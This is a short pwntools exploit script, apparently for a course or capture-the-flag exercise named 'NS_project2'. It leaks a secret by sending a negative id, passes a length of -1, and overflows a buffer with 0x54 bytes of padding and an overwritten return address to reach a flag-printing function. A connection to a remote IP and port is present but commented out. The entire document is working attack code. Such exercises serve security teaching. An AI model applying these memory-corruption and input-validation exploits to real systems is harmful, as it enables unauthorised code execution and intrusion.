from pwn import *
context(arch='i386', os='linux')
context.terminal = ['bash']

host, port = '140.113.194.81', 20062
# p = remote(host, port)
p = process('refs/NS_project2_src/main')
# print p.recvline()

p.recvuntil('Your choice:')
p.sendline('1')

p.recvuntil('Please input id:')
p.sendline('-1')

p.recvuntil('Age: ')
secret = p.recvline()
print '---\n' + 'Secret: ' + secret + '---\n'

p.recvuntil('Your choice:')
p.sendline('2')

p.recvuntil('Please input secret first:')
p.sendline(secret)

p.recvuntil('Please input id:')
p.sendline('0')
# p.sendline('1') # sol_2

p.recvuntil('Input new note length:')
p.sendline('-1')
sleep(0.1)
payload = flat([
    'a'*0x54,
    # 'a'*0x28, # sol_2
    p32(0x08048a08)
])
p.sendline(payload)
p.recvuntil('Done!')

p.recvuntil('Your choice:')
p.sendline('3')
p.recvuntil('Congrats1!\n')
flag1 = p.recvline()
print '---\n' + 'Flag1:  ' + flag1 + '---\n'

# p.interactive()
